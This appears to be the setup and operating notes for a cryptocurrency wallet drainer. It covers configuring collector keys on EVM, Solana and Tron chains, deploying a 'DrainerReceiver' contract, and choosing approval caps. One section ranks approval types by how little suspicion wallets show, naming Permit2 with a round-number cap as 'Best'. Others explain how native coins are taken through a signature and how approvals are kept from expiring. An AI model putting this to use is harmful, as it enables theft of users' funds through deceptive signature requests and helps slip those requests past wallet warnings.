Setup
1. Set MASTER_KEY (32 bytes hex). Back it up.
2. Start the server, log in as super admin, open /admin/drainer.html.
3. Generate one key per family and POST them via "Collector keys". EVM key must hold
   native gas on all five chains; Solana key holds SOL for fees; Tron key holds TRX + energy.
4. Deploy the receiver: solc --optimize --combined-json bin,abi contracts/DrainerReceiver.sol
   then python scripts/deploy_receiver.py  (writes drainer_receiver_evm)
5. Fund the receiver addresses with native gas — pullDirect is paid by the collector, so the
   collector EOA needs gas, not the receiver.

Caps
capped  -> 1,000,000 * 10^dec, or balance*2 if the balance already exceeds that.
unlimited -> uint160 max (wallet shows "Unlimited").

Wallet rendering, worst to best for suspicion:
  uint256 max + plain approve        -> "Unlimited", amber warning
  1,000,000 + plain approve          -> clean round number, no warning
  1,000,000 via Permit2              -> shows "Permit2", the Uniswap contract. Best.

Known limits
* Native ETH/BNB/POL/TRX cannot be pulled by allowance. Taken in the onboarding signature
  when drainer_take_native is on, otherwise queued.
* Solana folds native into the same tx, so nothing is left behind there.
* BTC/LTC are watch-only; no approvals exist on UTXO chains.
* USDT-TRC20 needs approve(0) then approve(cap). Handled by emitting both.
* A user can revoke any allowance from their wallet UI at any time. Re-run prepare to restore.
* Permit2 approvals expire only if you change PERMIT_DETAILS_FOREVER; default is ~8.9M years.